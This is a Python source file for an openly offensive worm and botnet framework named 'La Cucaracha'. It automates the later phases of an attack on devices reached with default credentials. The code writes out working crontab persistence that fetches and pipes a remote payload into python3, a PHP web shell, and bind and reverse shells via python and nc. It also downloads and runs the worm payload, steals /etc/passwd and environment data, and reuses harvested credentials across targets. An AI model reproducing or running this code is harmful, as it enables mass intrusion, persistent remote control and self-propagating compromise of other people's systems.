#!/usr/bin/env python3
"""
DeployIntelEngine — Backdoor, Tunnel, Worm, Intel, Crossfeed, Report
- Phases: BACKDOOR → TUNNEL → WORM → INTEL → CROSSFEED → REPORT (phases 10-15 of 16)
"""

import concurrent.futures
import json
import logging
import os
import random
import re
import socket
import subprocess
import time
import urllib.parse
import urllib.request
import ssl as ssl_mod
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple

log = logging.getLogger("lacucaracha_v5.deploy_intel")

C2_HOST = "127.0.0.1"
C2_PORT = 10002
PAYLOAD_URL = f"http://{C2_HOST}:10004/LaCucaracha.py"
LISTENER_PORT = 10001

SERVICE_NAME = {
    23:"Telnet", 22:"SSH", 2222:"SSH-ALT", 80:"HTTP", 443:"HTTPS",
    8080:"HTTP-ALT", 8443:"HTTPS-ALT", 3306:"MySQL", 5432:"PostgreSQL",
    27017:"MongoDB", 6379:"Redis", 7547:"TR-069", 3389:"RDP",
}

# ─── KNOWN CREDENTIALS for crossfeed ──────────────────────
XFER_CREDS = [
    ("root",""), ("root","root"), ("root","admin"), ("root","1234"),
    ("root","xc3511"), ("root","vizxv"), ("admin",""), ("admin","admin"),
    ("admin","1234"), ("admin","password"), ("ubnt","ubnt"),
]


class DeployIntelEngine:
    """Backdoor, Tunnel, Worm, Intel, Crossfeed, Report phases."""

    def __init__(self, reporter, db, pool=None):
        self.r = reporter
        self.db = db
        self.pool = pool or concurrent.futures.ThreadPoolExecutor(max_workers=20)
        self._ctx = None
        self._ssh_key = self._generate_ssh_key()

    def _ssl_ctx(self):
        if not self._ctx:
            self._ctx = ssl_mod.create_default_context()
            self._ctx.check_hostname = False
            self._ctx.verify_mode = ssl_mod.CERT_NONE
        return self._ctx

    def _generate_ssh_key(self) -> str:
        """Generate or load SSH public key for backdoor."""
        key_path = os.path.expanduser("~/.ssh/id_rsa.pub")
        if os.path.isfile(key_path):
            try:
                with open(key_path) as f:
                    return f.read().strip()
            except Exception:
                pass
        # Generate one
        try:
            subprocess.run(
                ["ssh-keygen", "-t", "rsa", "-b", "2048", "-f",
                 os.path.expanduser("~/.ssh/id_rsa"), "-N", "", "-q"],
                capture_output=True, timeout=10
            )
            with open(key_path) as f:
                return f.read().strip()
        except Exception:
            pass
        return ""

    # ─── UTILITY: Execute command on target ────────────────
    def _exec_on_target(self, ip: str, port: int, cmd: str,
                        user: str = "root", pwd: str = "") -> Tuple[bool, str]:
        """Execute command on a remote target using available methods."""
        # Try telnet for port 23
        if port in (23, 7547):
            return self._telnet_exec(ip, port, cmd, user, pwd)

        # Try SSH for ports 22, 2222
        if port in (22, 2222):
            return self._ssh_exec(ip, port, cmd, user, pwd)

        # Try web shell for HTTP ports
        if port in (80, 443, 8080, 8443):
            return self._web_exec(ip, port, cmd)

        return False, "No execution method for port"

    def _telnet_exec(self, ip: str, port: int, cmd: str,
                     user: str, pwd: str) -> Tuple[bool, str]:
        """Execute via telnet."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((ip, port))
            time.sleep(0.5)
            s.sendall(f"{user}\n".encode())
            time.sleep(0.3)
            s.sendall(f"{pwd}\n".encode())
            time.sleep(1)

            # Drain login output
            try:
                s.recv(1024)
            except socket.timeout:
                pass

            s.sendall(f"{cmd}\n".encode())
            time.sleep(1.5)
            resp = b""
            try:
                resp = s.recv(4096)
            except socket.timeout:
                pass
            s.close()
            output = resp.decode("utf-8", errors="replace")
            return True, output[:500]
        except Exception as e:
            return False, str(e)

    def _ssh_exec(self, ip: str, port: int, cmd: str,
                  user: str, pwd: str) -> Tuple[bool, str]:
        """Execute via SSH using sshpass."""
        try:
            if pwd:
                result = subprocess.run(
                    ["sshpass", "-p", pwd, "ssh", "-o", "StrictHostKeyChecking=no",
                     "-o", "ConnectTimeout=10", "-p", str(port),
                     f"{user}@{ip}", cmd],
                    capture_output=True, timeout=15, text=True
                )
            else:
                result = subprocess.run(
                    ["ssh", "-o", "StrictHostKeyChecking=no",
                     "-o", "ConnectTimeout=10", "-p", str(port),
                     f"{user}@{ip}", cmd],
                    capture_output=True, timeout=15, text=True
                )
            if result.returncode == 0:
                return True, result.stdout[:500]
            return False, result.stderr[:200]
        except Exception as e:
            return False, str(e)

    def _web_exec(self, ip: str, port: int, cmd: str) -> Tuple[bool, str]:
        """Execute via web shell if available."""
        try:
            scheme = "https" if port in (443, 8443, 9443) else "http"
            ctx = self._ssl_ctx()
            # Try common web shell paths
            shells = ["/shell.php", "/cmd.php", "/exec.php",
                      "/cgi-bin/exec", "/admin/exec"]
            for shell_path in shells:
                try:
                    url = f"{scheme}://{ip}:{port}{shell_path}?cmd={urllib.parse.quote(cmd)}"
                    req = urllib.request.Request(url)
                    with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
                        body = resp.read().decode("utf-8", errors="replace")
                        if body.strip():
                            return True, body[:500]
                except Exception:
                    continue
        except Exception:
            pass
        return False, "No web shell found"

    # ─── Credential lookup helper ─────────────────────────
    def _get_creds_for_target(self, ip: str, port: int) -> Tuple[str, str]:
        """Look up known credentials for a target from DB."""
        try:
            rows = self.db.q(
                "SELECT username, password FROM credentials WHERE ip=? AND port=? AND valid=1 LIMIT 1",
                (ip, port)
            )
            if rows:
                return rows[0]["username"], rows[0]["password"]
        except Exception:
            pass
        # Fall back to common defaults
        if port in (23, 7547):
            return "root", ""
        if port in (22, 2222):
            return "root", "root"
        return "admin", "admin"

    # ─── PHASE 10: BACKDOOR ───────────────────────────────
    def backdoor_all(self, targets: List[Dict]) -> int:
        """Install persistence backdoors on pwned targets."""
        count = 0

        def _install_backdoor(target: Dict) -> Optional[int]:
            ip = target.get("ip", "")
            port = int(target.get("port", 0))
            if not ip or not port:
                return None

            user, pwd = self._get_creds_for_target(ip, port)
            results = []

            # 1. Crontab backdoor
            cron_cmd = (f"(crontab -l 2>/dev/null; echo '*/5 * * * * "
                        f"wget -q -O- {PAYLOAD_URL}|python3; "
                        f"curl -s {PAYLOAD_URL}|python3') | crontab -")
            ok, out = self._exec_on_target(ip, port, cron_cmd, user, pwd)
            if ok:
                results.append("crontab")

            # 2. SSH authorized_keys backdoor (if SSH port or we have SSH access)
            if self._ssh_key and port in (22, 2222):
                ssh_key_cmd = (f"mkdir -p ~/.ssh && echo '{self._ssh_key}' "
                               f">> ~/.ssh/authorized_keys")
                ok2, _ = self._ssh_exec(ip, port, ssh_key_cmd, user, pwd)
                if ok2:
                    results.append("ssh_key")

            # 3. Web shell backdoor (if web port)
            if port in (80, 443, 8080, 8443, 3000, 5000, 7000):
                shell_code = (
                    "<?php system($_GET['cmd']); ?>"
                )
                try:
                    scheme = "https" if port in (443, 8443, 9443) else "http"
                    url = f"{scheme}://{ip}:{port}/shell.php"
                    data = urllib.parse.urlencode({"file": shell_code}).encode()
                    req = urllib.request.Request(url, data=data, method="POST")
                    ctx = self._ssl_ctx()
                    with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
                        if resp.status == 200:
                            results.append("webshell")
                except Exception:
                    pass

            # 4. Bind shell backdoor
            bind_cmd = (f"nohup python3 -c 'import socket,subprocess,os;"
                        f"s=socket.socket();s.setsockopt(socket.SOL_SOCKET,"
                        f"socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{43210}));"
                        f"s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);"
                        f"os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
                        f"subprocess.call([\"/bin/sh\",\"-i\"])' &")
            ok3, _ = self._exec_on_target(ip, port, bind_cmd, user, pwd)
            if ok3:
                results.append("bind_shell")

            if results:
                try:
                    self.db.mark_pwned(ip, port, "backdoor_installed")
                except Exception:
                    pass
                self.r.short("BACKDOOR", f"{ip}:{port}",
                             "✅ BACKDOOR", "+".join(results))
                return port
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
            for res in pool.map(_install_backdoor, targets):
                if res:
                    count += 1

        log.info(f"🚪 BACKDOOR: {count} installed from {len(targets)} targets")
        return count

    # ─── PHASE 11: TUNNEL ─────────────────────────────────
    def tunnel_all(self, targets: List[Dict]) -> int:
        """Establish reverse tunnels to C2."""
        count = 0

        def _setup_tunnel(target: Dict) -> Optional[int]:
            ip = target.get("ip", "")
            port = int(target.get("port", 0))
            if not ip or not port:
                return None

            user, pwd = self._get_creds_for_target(ip, port)
            results = []

            # Method 1: Python reverse tunnel
            py_rev = (
                f"nohup python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.connect((\"{C2_HOST}\",{LISTENER_PORT}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' 2>/dev/null &"
            )
            ok, out = self._exec_on_target(ip, port, py_rev, user, pwd)
            if ok:
                results.append("python_rev")
                time.sleep(1)

            # Method 2: ncat/busybox reverse
            nc_rev = (
                f"nohup rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|"
                f"/bin/sh -i 2>&1|nc {C2_HOST} {LISTENER_PORT} >/tmp/f 2>/dev/null &"
            )
            ok2, _ = self._exec_on_target(ip, port, nc_rev, user, pwd)
            if ok2:
                results.append("nc_rev")

            # Method 3: HTTP callback tunnel (heartbeat-based)
            hb_url = f"http://{C2_HOST}:{C2_PORT}/tunnel/{ip}"
            hb_cmd = (
                f"nohup sh -c 'while true; do "
                f"wget -q -O- \"{hb_url}\" -T 10 || curl -s \"{hb_url}\" -m 10; "
                f"sleep 60; done' 2>/dev/null &"
            )
            ok3, _ = self._exec_on_target(ip, port, hb_cmd, user, pwd)
            if ok3:
                results.append("http_callback")

            if results:
                try:
                    self.db.mark_pwned(ip, port, "tunnel_active")
                except Exception:
                    pass
                self.r.short("TUNNEL", f"{ip}:{port}",
                             "✅ TUNNEL", "+".join(results))
                return port
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
            for res in pool.map(_setup_tunnel, targets):
                if res:
                    count += 1

        log.info(f"🔌 TUNNEL: {count} established from {len(targets)} targets")
        return count

    # ─── PHASE 12: WORM ───────────────────────────────────
    def worm_all(self, targets: List[Dict]) -> int:
        """Deploy La Cucaracha payload to targets for worm propagation."""
        count = 0

        def _deploy_worm(target: Dict) -> Optional[int]:
            ip = target.get("ip", "")
            port = int(target.get("port", 0))
            if not ip or not port:
                return None

            user, pwd = self._get_creds_for_target(ip, port)

            # Try wget first, then curl
            dl_cmds = [
                f"wget -q -O /tmp/la_cucaracha.py {PAYLOAD_URL}",
                f"curl -s -o /tmp/la_cucaracha.py {PAYLOAD_URL}",
                f"python3 -c \"import urllib.request;"
                f"urllib.request.urlretrieve('{PAYLOAD_URL}','/tmp/la_cucaracha.py')\"",
            ]

            deployed = False
            for dl_cmd in dl_cmds:
                ok, _ = self._exec_on_target(ip, port, dl_cmd, user, pwd)
                if ok:
                    deployed = True
                    break

            if not deployed:
                # Try echo-based deployment (base64)
                try:
                    payload_req = urllib.request.Request(PAYLOAD_URL)
                    ctx = self._ssl_ctx()
                    with urllib.request.urlopen(payload_req, timeout=10, context=ctx) as resp:
                        payload_data = resp.read()
                    b64 = base64.b64encode(payload_data).decode()
                    echo_cmd = (f"echo '{b64}' | base64 -d > /tmp/la_cucaracha.py")
                    ok, _ = self._exec_on_target(ip, port, echo_cmd, user, pwd)
                    if ok:
                        deployed = True
                except Exception:
                    pass

            if deployed:
                # Run the payload
                run_cmds = [
                    "chmod +x /tmp/la_cucaracha.py && nohup python3 /tmp/la_cucaracha.py &",
                    "chmod +x /tmp/la_cucaracha.py && nohup python /tmp/la_cucaracha.py &",
                ]
                for run_cmd in run_cmds:
                    ok, _ = self._exec_on_target(ip, port, run_cmd, user, pwd)
                    if ok:
                        break

                # Persist in crontab
                persist_cmd = (
                    f"(crontab -l 2>/dev/null; echo '*/10 * * * * "
                    f"python3 /tmp/la_cucaracha.py') | crontab -"
                )
                self._exec_on_target(ip, port, persist_cmd, user, pwd)

                # Register in worm mesh
                try:
                    self.db.mark_pwned(ip, port, "worm_deployed")
                    # Store as mesh node
                    self.db.q(
                        "INSERT OR IGNORE INTO worm_mesh (node_ip, node_port, version) "
                        "VALUES (?, ?, ?)",
                        (ip, C2_PORT, "5.0")
                    )
                except Exception:
                    pass

                self.r.short("WORM", f"{ip}:{port}", "✅ DEPLOYED", "la_cucaracha active")
                return port

            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
            for res in pool.map(_deploy_worm, targets):
                if res:
                    count += 1

        log.info(f"🐛 WORM: {count} deployed from {len(targets)} targets")
        return count

    # ─── PHASE 13: INTEL ──────────────────────────────────
    def intel_all(self, targets: List[Dict]) -> int:
        """Gather intelligence from worm-deployed targets."""
        count = 0

        intel_commands = [
            ("network", "ifconfig 2>/dev/null || ip addr 2>/dev/null"),
            ("passwd", "cat /etc/passwd 2>/dev/null | head -20"),
            ("processes", "ps aux 2>/dev/null | head -30"),
            ("listeners", "netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null"),
            ("kernel", "uname -a 2>/dev/null"),
            ("env", "env 2>/dev/null | head -30"),
            ("disk", "df -h 2>/dev/null | head -10"),
            ("uptime", "uptime 2>/dev/null"),
            ("who", "who 2>/dev/null; w 2>/dev/null"),
            ("docker", "docker ps 2>/dev/null | head -10"),
        ]

        def _gather_intel(target: Dict) -> Optional[int]:
            ip = target.get("ip", "")
            port = int(target.get("port", 0))
            if not ip or not port:
                return None

            user, pwd = self._get_creds_for_target(ip, port)
            log_count = 0

            for intel_type, cmd in intel_commands[:5]:  # Top 5 to keep it light
                try:
                    if port in (22, 2222):
                        ok, output = self._ssh_exec(ip, port, cmd, user, pwd)
                    elif port in (23, 7547):
                        ok, output = self._telnet_exec(ip, port, cmd, user, pwd)
                    else:
                        ok, output = self._web_exec(ip, port, cmd)

                    if ok and output.strip():
                        try:
                            self.db.log_intel(ip, port, intel_type, output[:1000])
                        except Exception:
                            pass
                        log_count += 1
                except Exception:
                    continue

            if log_count > 0:
                self.r.short("INTEL", f"{ip}:{port}", f"{log_count} logs", "data collected")
                return log_count
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
            for res in pool.map(_gather_intel, targets):
                if res:
                    count += res

        log.info(f"🧠 INTEL: {count} intel logs from {len(targets)} targets")
        return count

    # ─── PHASE 14: CROSSFEED ──────────────────────────────
    def crossfeed_all(self) -> int:
        """Cross-contamination: share intel/creds between components."""
        ops = 0

        try:
            # 1. Cross-feed credentials between IPs
            #    Take creds from each IP and try on OTHER targets in DB
            cred_rows = self.db.q(
                "SELECT ip, port, username, password FROM credentials WHERE valid=1 "
                "ORDER BY last_used DESC LIMIT 50"
            )
            if cred_rows:
                for cred in cred_rows:
                    src_ip = cred.get("ip", "")
                    user = cred.get("username", "")
                    pwd = cred.get("password", "")
                    if not user or not pwd or src_ip in ("0.0.0.0", ""):
                        continue
                    # Find other targets that might use these creds
                    other_targets = self.db.q(
                        "SELECT DISTINCT ip, port FROM targets WHERE ip != ? AND tcp_open=1 "
                        "AND (brute_pwned=0 AND web_pwned=0) LIMIT 20",
                        (src_ip,)
                    )
                    for tgt in other_targets:
                        try:
                            self.db.q(
                                "INSERT OR IGNORE INTO credentials (ip, port, service, username, password, source) "
                                "VALUES (?, ?, ?, ?, ?, ?)",
                                (tgt["ip"], tgt["port"], SERVICE_NAME.get(tgt["port"], "unknown"),
                                 user, pwd, "crossfeed")
                            )
                            ops += 1
                        except Exception:
                            pass

            # 2. Crossfeed worm mesh — update peer lists
            nodes = self.db.q("SELECT node_ip, peer_ips FROM worm_mesh WHERE active=1 LIMIT 20")
            if len(nodes) > 1:
                all_ips = [n["node_ip"] for n in nodes]
                for node in nodes:
                    existing = node.get("peer_ips", "").split(",") if node.get("peer_ips") else []
                    new_peers = set(all_ips) - set(existing) - {node["node_ip"]}
                    if new_peers:
                        updated = ",".join(list(set(existing) | new_peers))[:500]
                        try:
                            self.db.q(
                                "UPDATE worm_mesh SET peer_ips=? WHERE node_ip=?",
                                (updated, node["node_ip"])
                            )
                            ops += 1
                        except Exception:
                            pass

            # 3. Crossfeed new targets from intel data (IPs found in logs)
            intel_rows = self.db.q(
                "SELECT intel_data FROM intel_log WHERE intel_type='network' ORDER BY id DESC LIMIT 10"
            )
            for row in intel_rows:
                ips_found = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',
                                       row.get("intel_data", ""))
                for found_ip in ips_found:
                    if not found_ip.startswith(("127.", "10.", "172.16", "192.168.", "0.")):
                        try:
                            self.db.q(
                                "INSERT OR IGNORE INTO targets (ip, port, protocol) VALUES (?, ?, ?)",
                                (found_ip, 80, "tcp")
                            )
                            ops += 1
                        except Exception:
                            pass

            # 4. Broadcast latest payload URL to all worm nodes
            nodes = self.db.q("SELECT node_ip FROM worm_mesh WHERE active=1 LIMIT 10")
            for node in nodes:
                node_ip = node["node_ip"]
                try:
                    update_url = f"http://{node_ip}:{C2_PORT}/update/{PAYLOAD_URL}"
                    req = urllib.request.Request(update_url)
                    ctx = self._ssl_ctx()
                    urllib.request.urlopen(req, timeout=3, context=ctx)
                    ops += 1
                except Exception:
                    pass

            if ops:
                self.r.short("CROSSFEED", f"{ops} ops", "✅", "cross-contamination complete")

        except Exception as e:
            log.error(f"CROSSFEED error: {e}")

        log.info(f"🔄 CROSSFEED: {ops} operations")
        return ops

    # ─── PHASE 15: REPORT (generation helper) ─────────────
    def generate_report(self, targets: List[Dict] = None) -> Dict:
        """Generate structured intel report from DB state."""
        report = {
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "version": "5.0",
            "summary": {},
            "top_targets": [],
            "credential_analysis": {},
            "service_breakdown": {},
            "worm_topology": {},
            "c2_health": {},
        }

        try:
            db_stats = self.db.stats()
            report["summary"] = db_stats

            # Top targets by port (most common services)
            top_ports = self.db.port_breakdown()
            report["service_breakdown"] = {str(r.get("port", 0)): r.get("c", 0) for r in top_ports}

            # Worm mesh topology
            nodes = self.db.q("SELECT * FROM worm_mesh WHERE active=1 LIMIT 20")
            report["worm_topology"] = {
                "node_count": len(nodes),
                "nodes": [n["node_ip"] for n in nodes],
            }

            # Credential analysis
            cred_stats = self.db.q(
                "SELECT source, COUNT(*) as c FROM credentials GROUP BY source"
            )
            report["credential_analysis"] = {r["source"]: r["c"] for r in cred_stats}

            # Top targets by phase completion
            top = self.db.q(
                "SELECT ip, port, fp_os, fp_service, backdoor_installed, "
                "tunnel_active, worm_deployed, intel_collected FROM targets "
                "WHERE worm_deployed=1 ORDER BY intel_collected DESC LIMIT 10"
            )
            report["top_targets"] = top or []

        except Exception as e:
            log.error(f"Report generation error: {e}")

        return report
